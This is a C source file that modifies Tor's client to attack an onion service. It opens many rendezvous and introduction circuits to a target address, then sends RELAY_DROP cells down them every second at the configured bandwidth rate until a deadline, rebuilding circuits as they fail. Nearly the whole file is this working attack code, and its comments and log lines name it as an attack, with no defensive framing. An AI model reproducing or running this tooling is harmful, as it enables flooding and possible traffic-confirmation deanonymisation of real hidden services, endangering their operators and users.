/**
 * \file hs_rd_attack.c
 * \brief contains code to connect to request hidden service and send
 *  relay drop cells to it 
 **/

#include "hs_rd_attack.h"
#include "hsattackcircuitlock.h"
/* Global variable but not accessible from other files
 * Allow the program to keep a state of the attack 
 *
 * A little bit sexier than extern variables, still messy
 * but ... Ca casse pas trois pattes a un canard :-)
 */

/*NOTE
 *
 * Use control_event to talk with controller
 *
 * Need event-based control to carry out the steps of the attack
 */
static hs_rd_attack_t *attack_infos = NULL;

/*tor_mutex_t circuit_mutex;*/

#define LOCK_ATTACK() STMT_BEGIN  \
  tor_mutex_acquire(&attack_infos->stats->attack_mutex); \
  STMT_END

#define UNLOCK_ATTACK() STMT_BEGIN \
  tor_mutex_release(&attack_infos->stats->attack_mutex); \
  STMT_END

#define LOCK_CIRCUIT() STMT_BEGIN \
  tor_mutex_acquire(&circuit_mutex); \
  STMT_END

#define UNLOCK_CIRCUIT() STMT_BEGIN \
  tor_mutex_release(&circuit_mutex); \
  STMT_END

static int launch_new_rendezvous(){
  uint8_t flags = CIRCLAUNCH_NEED_UPTIME;
  circ_info_t *circmap = (circ_info_t *) tor_malloc(sizeof(circ_info_t));
  circmap->extend_info = NULL;
  circmap->introcirc = NULL;
  circmap->state_intro = CIRC_NO_STATE;
  circmap->state_rend = REND_CIRC_BUILDING;
  circmap->do_not_touch = 0;
  log_info(LD_REND, "HS_ATTACK: launching rend circuit\n");
  circmap->rendcirc = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
      CIRCLAUNCH_IS_INTERNAL);
  circmap->introcirc = circuit_launch(CIRCUIT_PURPOSE_C_GENERAL, flags);
  if (circmap->rendcirc) {
    log_info(LD_REND, "HS_ATTACK : rendcircuit launched\n");
    circmap->launched_at = time(NULL);
    circmap->rendcirc->rend_data =
      rend_data_client_create(attack_infos->current_target, NULL, NULL, REND_NO_AUTH);
    smartlist_add(attack_infos->rendcircs, circmap);
    attack_infos->stats->nbr_rendcircs++;
    return 0;
  } else {
    log_debug(LD_REND, "rendcircuit not launched\n");
    tor_free(circmap);
    return -1;
  }
}

static int 
hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
  log_info(LD_REND,"HS_ATTACK : entering hs_attack_init_rendezvous_circuits\n");
  int c = 0;
  //LOCK_ATTACK();
  while (attack_infos->rendcircs->num_used < nbr_circuits) {
    if (launch_new_rendezvous() < 0){
      c++;
      if (c >= RETRY_THRESHOLD*nbr_circuits)
        return -1;
    }
  }
  //UNLOCK_ATTACK();
  // launch some more general circuit in the init phase for backup :)
  for (int i = 0; i < nbr_circuits/2; i++)
    circuit_launch(CIRCUIT_PURPOSE_C_GENERAL, CIRCLAUNCH_NEED_UPTIME);
  return 0;
}

/*
 * Create a circuit towards the introduction point and send
 * nbr_circuits different INTRO1 cells
 * When monitoring is 1; the function is called from monitor_healthiness
 * and should not send control_event
 */

static int hs_attack_init_intro_circuit(int retry, int monitoring) {
  //uint8_t flags = CIRCLAUNCH_ONEHOP_TUNNEL;
  uint8_t flags = CIRCLAUNCH_NEED_UPTIME;
  int do_we_retry_intro = 0;
  /*if (retry == 0){*/
    /*log_info(LD_REND, "HS_ATTACK: Entering hs_attack_init_intro_circuit\n");*/
    /* kind of hack. We don't have ant_set_p_circid_chan(circ, p_circ_id, p_chan);_y circuit yet
     * to use as introducing circuit. Launch one intro circ
     * for each rendezvous circ  and wait
     * until we can canibilize it*/
    /*SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {*/
      /*circmap->introcirc = circuit_launch(CIRCUIT_PURPOSE_C_GENERAL, flags);*/
    /*} SMARTLIST_FOREACH_END(circmap);*/

    /*attack_infos->retry_intro++;*/
    /*control_event_hs_attack(HS_ATTACK_RETRY_INTRO);*/
    /*return 0; */
  /*}*/
    
    /*
     * Fetch them one for all
     */

  int count_missing = 0;
  int get_one;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    get_one = 0;
    if (!circmap->extend_info && circmap->state_rend > REND_CIRC_BUILDING) {
      circmap->extend_info = rend_client_get_random_intro(
          circmap->rendcirc->rend_data);
      if (circmap->extend_info)
        get_one = 1;
    }
    if (!circmap->extend_info) {
      if (circmap->state_rend == REND_CIRC_READY_FOR_INTRO) {
        rend_client_refetch_v2_renddesc(circmap->rendcirc->rend_data);
        log_info(LD_REND,
          "HS_ATTACK: No intro point for '%s': re-fetching service descriptor an try later.\n",
          attack_infos->current_target);
      }
      else{
        log_info(LD_REND,"HS_ATTACK: rendcirc not acked rendezvous cell yet\n");
      }
      count_missing++;
    }
    else if(get_one) {
      log_info(LD_REND, "HS_ATTACK: Yay! we have an intropoint : %s\n", extend_info_describe(
         circmap->extend_info));
    }
  } SMARTLIST_FOREACH_END(circmap);
  if (count_missing) {
    if (!monitoring) {
      attack_infos->retry_intro++;
      /*control_event_hs_attack(HS_ATTACK_RETRY_INTRO);*/
    }
    /*return 0;*/
    do_we_retry_intro = 1;
  }
  // Wait that all rendcirc have oppened -- kind of stupid
  /*SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {*/
    /*if (circmap->rendcirc->base_.state != CIRCUIT_STATE_OPEN) {*/
      /*if (!monitoring) {*/
        /*attack_infos->retry_intro++;*/
        /*control_event_hs_attack(HS_ATTACK_RETRY_INTRO);*/
      /*} */
      /*log_info(LD_REND, "HS_ATTACK: all rendcirc are not open yet .. delaying..\n");*/
      /*return 0;*/
    /*}*/
  /*} SMARTLIST_FOREACH_END(circmap);*/

  if (attack_infos->state == INITIALIZED)
    attack_infos->state =  ATTACK_STATE_CONNECT_TO_INTRO;
  /*Completly mindfuck yeah but ... Look for a general circuit; change its role
   * and send intro request
   * without having build previously a GENERAL circ, we got null =>
   * Always build a general circ before then build the circ we need for introduction
   * because introcircs have been designed to be extension of general circs towards
   * an introduction point*/
  //return 0;
  int count_failure = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (circmap->state_intro == CIRC_NO_STATE){
      if (circmap->introcirc->base_.state == CIRCUIT_STATE_OPEN &&
          circmap->extend_info) {
        circmap->introcirc = circuit_launch_by_extend_info(
            CIRCUIT_PURPOSE_C_INTRODUCING, circmap->extend_info, flags);
        if (circmap->introcirc){
          circmap->state_intro = INTRO_CIRC_BUILDING;
          log_info(LD_REND, "HS_ATTACK: Intro circ building. Swibidi yay !\n");
        }
        else {
          count_failure++;
          if (circmap->extend_info) {
            /*extend_info_free(circmap->extend_info);*/
            circmap->extend_info = NULL;
          }
          /*log_info(LD_REND, "HS_ATTACK: Launching a new general circ for backup\n");*/
          /*circuit_launch(CIRCUIT_PURPOSE_C_GENERAL, flags); //maybe we don't have enough circs*/
        }
      }
      else
        count_failure++;
    }
  } SMARTLIST_FOREACH_END(circmap);
  if (count_failure && retry < RETRY_THRESHOLD*count_failure) {
    log_info(LD_REND, "HS_ATTACK: Something went wrong when extending introcirc - Our introcirc is not open yet or we need new extend info\n");
    //could do this with subtype of event like INFO : RETRY_INTRO
    //but it would be less nice on client side
    /*we have circuit; change its purpose*/
    if (!monitoring) {
      attack_infos->retry_intro++;
      /*control_event_hs_attack(HS_ATTACK_RETRY_INTRO);*/
    }
    /*return 0;*/
    do_we_retry_intro = 1;
  }
  else if (count_failure && retry >= RETRY_THRESHOLD*count_failure) {
    //tor_free(attack_infos->circ_to_intro->circ);
    //tor_free(attack_infos->circ_to_intro);
    //log_debug(LD_REND, "HS_ATTACK: introcirc has failed to extend too much time\n");
    return 0;
  }
  /*log_info(LD_REND, "HS_ATTACK: We have an intro circ building or ready !\n");*/
  if (do_we_retry_intro && !monitoring) {
    control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
  }
  return 0;
}

/*
 * Called by rend_client_rendezvous_acked to launch introcell 
 * or when the intro circ opened
 * if introcel circuit is ready
 */

//TODO code duplication to fix -- move from a foreach to a for
void hs_attack_send_intro_cell_callback(origin_circuit_t *rend_or_intro_circ){
  //return;
  int retval=0;
  int launch = 0;
  circ_info_t *circmap;
  /*LOCK_CIRCUIT();*/
  /*LOCK_ATTACK();*/
  for (int circmaps_sl_idx = 0; circmaps_sl_idx < smartlist_len(attack_infos->rendcircs); circmaps_sl_idx++) {
    circmap = smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
    if (!circmap) {
      log_debug(LD_REND, "HS_ATTACK: null circmap, index %d\n", circmaps_sl_idx);
    }
    else {
      if (rend_or_intro_circ == circmap->rendcirc) {
        if (circmap->state_intro == INTRO_CIRC_READY)
          launch = 1;
      }
      if (rend_or_intro_circ == circmap->introcirc) {
        if (circmap->state_rend == REND_CIRC_READY_FOR_INTRO)
          launch = 1;
      }
      if (launch){
        circmap->introcirc->rend_data = rend_data_dup(circmap->rendcirc->rend_data);
        retval = rend_client_send_introduction(circmap->introcirc,
            circmap->rendcirc);
        if(retval < 0) {
          //log_debug(LD_BUG, "HS_ATTACK: INTRO not sent. retval: %d", retval);
          // should do something if it happens -- kill circuit and try again ?
          // exit the prog if it happens too much ?
          break;
        }
        log_info(LD_REND, "HS_ATTACK: rend_circ_intro_cell_sent !\n");
        circmap->state_rend = REND_CIRC_INTRO_CELL_SENT;
        circmap->state_intro = REND_CIRC_INTRO_CELL_SENT;
        break;
      }
    }
  }
  /*UNLOCK_ATTACK();*/
  /*UNLOCK_CIRCUIT();*/
}

/*
 * Received a rendezous2 cell on circ; circ joined and is
 * now ready to send relaydrop cells
 * Send message to the controller if all circs are ready
 */
void hs_attack_mark_rendezvous_ready(origin_circuit_t *rendcirc) {
  int count_ready = 0;
  /*LOCK_CIRCUIT();*/
  /*LOCK_ATTACK();*/
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (circmap->rendcirc == rendcirc) {
      log_info(LD_REND,"HS_ATTACK: Marking rendezvous circuit ready \n");
      circmap->state_rend = REND_CIRC_READY_FOR_RD;

      /*
       * Do things that should be done when an ap conn is linked to the
       * circuit or we could get crash later
       */

      circmap->rendcirc->base_.timestamp_dirty = time(NULL);
      pathbias_count_use_attempt(circmap->rendcirc);

    }
    if (circmap->state_rend == REND_CIRC_READY_FOR_RD)
      count_ready++;
  } SMARTLIST_FOREACH_END(circmap);
  if (count_ready == smartlist_len(attack_infos->rendcircs) &&
      attack_infos->state != ATTACK_STATE_LAUNCHED) {
    //tell controller that we are ready to launch the attack
    log_info(LD_REND, "HS_ATTACK: Seems that we are ready to launch the attack. Waiting instructions\n");
    control_event_hs_attack(HS_ATTACK_RD_READY);
  }
  /*UNLOCK_ATTACK();*/
  /*UNLOCK_CIRCUIT();*/
}

void hs_attack_mark_rendezvous_ready_for_intro(origin_circuit_t *rendcirc) {
  circ_info_t *circmap;
  /*LOCK_CIRCUIT();*/
  /*LOCK_ATTACK();*/
  for (int circmaps_sl_idx = 0; circmaps_sl_idx < smartlist_len(attack_infos->rendcircs); circmaps_sl_idx++) {
    circmap = smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
    if (!circmap) {
      log_debug(LD_REND, "HS_ATTACK: null circmap, index %d", circmaps_sl_idx);
    }
    else if (circmap->rendcirc == rendcirc) {
      log_info(LD_REND, "HS_ATTACK: marking rendezvous circ ready for sending intro\n");
      circmap->state_rend = REND_CIRC_READY_FOR_INTRO;
      circmaps_sl_idx = smartlist_len(attack_infos->rendcircs);
    }
  }
  /*UNLOCK_ATTACK();*/
  /*UNLOCK_CIRCUIT();*/
  /*SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {*/
    /*if (circmap->rendcirc == rendcirc) {*/
      /*log_info(LD_REND, "HS_ATTACK: marking rendezvous circ ready for sending intro\n");*/
      /*circmap->state_rend = REND_CIRC_READY_FOR_INTRO;*/
      /*return;*/
    /*}*/
  /*} SMARTLIST_FOREACH_END(circmap);*/
  /*log_debug(LD_REND, "HS_ATTACK: rendcirc not in the list !\n");*/
}

void hs_attack_mark_intro_ready(origin_circuit_t *introcirc) {
  log_info(LD_REND, "HS_ATTACK: Marking Introcirc ready\n");
  circ_info_t *circmap;
  /*LOCK_CIRCUIT();*/
  /*LOCK_ATTACK();*/
  for (int circmaps_sl_idx = 0; circmaps_sl_idx < smartlist_len(attack_infos->rendcircs); circmaps_sl_idx++) {
    circmap = smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
    if (!circmap) {
      log_debug(LD_REND, "HS_ATTACK: null circmap, index %d", circmaps_sl_idx);
    }
    else if (circmap->introcirc == introcirc) {
      circmap->state_intro = INTRO_CIRC_READY;
      circmaps_sl_idx = smartlist_len(attack_infos->rendcircs);
      circmap->introcirc->base_.timestamp_dirty = time(NULL);
      pathbias_count_use_attempt(circmap->introcirc);
    }
  }
  /*UNLOCK_ATTACK();*/
  /*UNLOCK_CIRCUIT();*/
  /*SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {*/
    /*if (circmap->introcirc == introcirc) {*/
      /*circmap->state_intro = INTRO_CIRC_READY;*/
      /*return;*/
    /*}*/
  /*}SMARTLIST_FOREACH_END(circmap);*/
}


/*
 *
 * Create a valid relay drop cell for session with circuit circ and sent it through circ
 *
 * If the cell cannot be sent, we mark the circuit for close and return -1
 */

static int send_rd_cell(origin_circuit_t *circ){
  if (relay_send_command_from_edge(0, TO_CIRCUIT(circ),
                                   RELAY_COMMAND_DROP,
                                   NULL, 0, circ->cpath->prev) < 0)
    return -1;
  return 0;
}


static void hs_attack_send_cb(evutil_socket_t fd, short events, void *args) {
  time_t now = time(NULL);
  if (*attack_infos->until > now) {
    int num_cells = (int)(get_options()->BandwidthRate / (CELL_MAX_NETWORK_SIZE));
    int cell_per_circuit = (int) num_cells / smartlist_len(attack_infos->rendcircs);
    if (HS_ATTACK_TESTING) {
      cell_per_circuit = 1;
    }
    int circmaps_sl_idx, circmaps_sl_len;
    circ_info_t *circmap;
    /*log_debug(LD_REND, "HS_ATTACK: number of cells sent per second: %d", num_cells);*/
    circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
    for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; circmaps_sl_idx++) {
      circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
      /*log_info(LD_REND, "HS_ATTACK: Trying to send rd cell down circ %s\n",*/
          /*circuit_list_path(circmap->rendcirc, 0));*/
      if (!circmap)
        continue;
      if (!circmap->do_not_touch && circmap->state_rend == REND_CIRC_READY_FOR_RD) {
        for (int j = 0; j <  cell_per_circuit; j++) {
          if (send_rd_cell(circmap->rendcirc) < 0) {
            circmap->do_not_touch = 1;
            break;
          }
          attack_infos->stats->tot_cells++;
        }
      }
    }
    struct timeval timeout = {1, 0};
    evtimer_add(attack_infos->ev, &timeout);
  }
}


static void hs_attack_launch(void *until_launch) {
  attack_infos->until = until_launch;
  attack_infos->state = ATTACK_STATE_LAUNCHED;
  /*todo check that BandwidthRate is in Bytes/s*/
  int num_cells = (int)(get_options()->BandwidthRate / (CELL_MAX_NETWORK_SIZE));
  /*log_debug(LD_REND, "HS_ATTACK: number of cells sent per second: %d", num_cells);*/
  int cell_per_circuit = (int) num_cells / smartlist_len(attack_infos->rendcircs);
  attack_infos->stats->cells_per_circuit = cell_per_circuit;
    /*Just send 1 rd through each rendezvous circ*/

  struct timeval timeout = {1, 0}; //1 second
  struct event *ev;
  ev = tor_evtimer_new(tor_libevent_get_base(), hs_attack_send_cb, NULL);
  attack_infos->ev = ev;
  evtimer_add(ev, &timeout);
}

void hs_attack_mark_for_close_cb(circuit_t *circ, int reason) {
  if (!CIRCUIT_IS_ORIGIN(circ) || !attack_infos)
    return;
  /*LOCK_CIRCUIT();*/
  /*LOCK_ATTACK();*/
  circ_info_t *circmap;
  int circmaps_sl_idx;
  int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
  for (circmaps_sl_idx = 0; circmaps_sl_idx  < circmaps_sl_len; circmaps_sl_idx++) {
    circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
    if (!circmap) {
      log_debug(LD_BUG, "HS_ATTACK: smartlist_get returned null");
      continue;
    }
    if (circmap->rendcirc == TO_ORIGIN_CIRCUIT(circ)) {
      circmap->do_not_touch = 1;
      log_info(LD_REND, "HS_ATTACK: set do_not_touch to true because of %d", reason);
    }
  }
  /*UNLOCK_ATTACK();*/
  /*UNLOCK_CIRCUIT();*/

}

static int check_expiration(circ_info_t *circmap, int idx) {
  time_t now = time(NULL);
  log_info(LD_REND, "HS_ATTACK: Checking circ expiration\n");
  if (circmap->do_not_touch || now - circmap->launched_at > HS_ATTACK_CIRC_TIMEOUT) {
    /*circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);*/
    /*circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);*/
    /*TO_CIRCUIT(circmap->rendcirc)->marked_for_close = 1;*/
    /*TO_CIRCUIT(circmap->introcirc)->marked_for_close = 1;*/
    //if (circmap->extend_info) // We are maybe here because we didn't got an extend info
    //  extend_info_free(circmap->extend_info);
    smartlist_del(attack_infos->rendcircs, idx);
    if (circmap->do_not_touch)
      log_info(LD_REND, "HS_ATTACK: removing one circ because do_not_touch was 1\n");
    else
      log_info(LD_REND, "HS_ATTACK: removing one circ because of timeout\n");
    // we might be here because of a timeout
    circmap->do_not_touch = 1;
    return 1;
  }
  return 0;
}

static void hs_attack_check_healthiness() {
  int removed_elements = 0;
  switch(attack_infos->state) {
    case INITIALIZED :
      // A circuit can get stuck trying to have extend info but does not succes.
    {
      circ_info_t *circmap;
      int circmaps_sl_idx;
      int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
      for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; circmaps_sl_idx++) {
        circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
        if (!circmap->extend_info) {
          if (check_expiration(circmap, circmaps_sl_idx)) {
            circmaps_sl_idx--;
            circmaps_sl_len--;
            removed_elements++;
          }
        }
      }
    }
    break;
    case ATTACK_STATE_CONNECT_TO_INTRO:
     {
       circ_info_t *circmap;
       int circmaps_sl_idx;
       int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
       int init_intro = 0;
       for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; circmaps_sl_idx++) {
         circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
         if (circmap->state_rend != REND_CIRC_READY_FOR_RD ||
             circmap->state_intro != REND_CIRC_INTRO_CELL_SENT) {
           if (check_expiration(circmap, circmaps_sl_idx)) {
             circmaps_sl_idx--;
             circmaps_sl_len--;
             removed_elements++;
           }
           init_intro = 1;
         }
       }
       log_info(LD_REND, "HS_ATTACK: Checked healthiness of %d circuits\n", smartlist_len(attack_infos->rendcircs)+removed_elements);
       if (init_intro)
         hs_attack_init_intro_circuit(attack_infos->retry_intro, 1);
     }
     break;
    case ATTACK_STATE_LAUNCHED:
      {
        circ_info_t *circmap;
        int init_intro = 0;
        int circmaps_sl_idx;
        /*LOCK_CIRCUIT();*/
        /*LOCK_ATTACK();*/
        int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
        for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; circmaps_sl_idx++) {
          circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
          //if (circmap->rendcirc->base_.state != CIRCUIT_STATE_OPEN &&
          /*log_info(LD_REND, "HS_ATTACK: checking state: %s\n", circuit_state_to_string(circmap->rendcirc->base_.state));*/
          if(circmap->state_rend == REND_CIRC_READY_FOR_RD && circmap->do_not_touch) {
            //log_info(LD_REND, "HS_ATTACK: circuit not open anymore was: %s\n", circuit_list_path(circmap->rendcirc, 0));
            /*TO_CIRCUIT(circmap->rendcirc)->marked_for_close = 1;*/
            //TO_CIRCUIT(circmap->introcirc)->marked_for_close = 1;
            /*extend_info_free(circmap->extend_info);*/
            smartlist_del(attack_infos->rendcircs, circmaps_sl_idx--);
            circmaps_sl_len--;
            init_intro = 1;
            removed_elements++;
          }
          // For new circuits
          else if (circmap->state_intro != REND_CIRC_INTRO_CELL_SENT ||
              circmap->state_rend != REND_CIRC_READY_FOR_RD) {
            if (check_expiration(circmap, circmaps_sl_idx)) {
              circmaps_sl_idx--;
              circmaps_sl_len--;
              removed_elements++;
              log_info(LD_REND, "HS_ATTACK: New circuit has been removed\n");
            }
            init_intro = 1;
          }
        }
        if (init_intro)
          hs_attack_init_intro_circuit(attack_infos->retry_intro, 1);
        /*UNLOCK_ATTACK();*/
        /*UNLOCK_CIRCUIT();*/
      }
      break;
  }
  /*LOCK_CIRCUIT();*/
  /*LOCK_ATTACK();*/
  for (int i = 0; i < removed_elements; i++){
    launch_new_rendezvous();
  }
  /*UNLOCK_ATTACK();*/
  /*UNLOCK_CIRCUIT();*/
  //circuit_close_all_marked();
  control_event_hs_attack(HS_ATTACK_MONITOR_HEALTHINESS);
}


static void free_hs_rd_attack(){
  circuit_free_all();
}


hs_attack_stats_t*
hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress, 
    int nbr_circuits, time_t *until) {
  log_info(LD_REND, "HS_ATTACK : Entering hs_attack_entry_point\n");
  if (!attack_infos){
    log_info(LD_REND,"HS_ATTACK : initalize attack_infos\n");
    attack_infos = (hs_rd_attack_t *) tor_malloc(sizeof(hs_rd_attack_t));
    attack_infos->rendcircs = smartlist_new();
    attack_infos->stats = (hs_attack_stats_t *)  tor_malloc(sizeof(hs_attack_stats_t));
    attack_infos->retry_intro = 0;
    attack_infos->nbr_circuits = nbr_circuits;
    attack_infos->stats->tot_cells = 0;
    attack_infos->stats->nbr_rendcircs = 0;
    attack_infos->stats->cells_per_circuit = 0;
    /* 
     * attack_already_launched is used in the callback of rendezvous circuit when 
     * RENDCELL2 is received.  In the init phase, we need to tell the controller
     * when all rdvcircs are ready to launch the attack. But during the attack, it is
     * possible to launch new rendezvous circs. In this case, we don't want to notice
     * the controller.
     * */
    /*attack_infos->extend_info = NULL;*/
    attack_infos->current_target = strdup(onionaddress);
    //attack_infos->rend_data = NULL;
    //attack_infos->extend_info = (extend_info_t *) tor_malloc(sizeof(extend_info_t));
    attack_infos->state = INITIALIZED;
    control_event_hs_attack(HS_ATTACK_MONITOR_HEALTHINESS);
  }
  switch(cmd) {
    case ESTABLISH_RDV:
      // Establish all rendezvous circuits
      if (hs_attack_init_rendezvous_circuits(nbr_circuits, onionaddress) < 0) {
        log_debug(LD_REND, "HS_ATTACK : not managed to create rendezvous circuits\n");
        return NULL;
      }
      //LOCK_ATTACK();
      if (hs_attack_init_intro_circuit(attack_infos->retry_intro, 0) < 0) {
          log_debug(LD_REND, "HS_ATTACK : not managed to create intro circuit\n");
          /*UNLOCK_ATTACK();*/
          return NULL; 
      }
      //UNLOCK_ATTACK();
      break;
    case SEND_RD: 

      hs_attack_launch(until);

      /*if (!HS_ATTACK_TESTING)*/
        /*free_hs_rd_attack();*/
      break;
    case CHECK_HEALTHINESS:
      //LOCK_ATTACK();
      hs_attack_check_healthiness();
      //UNLOCK_ATTACK();
      break;
    default: break;
  }
  return attack_infos->stats;
}
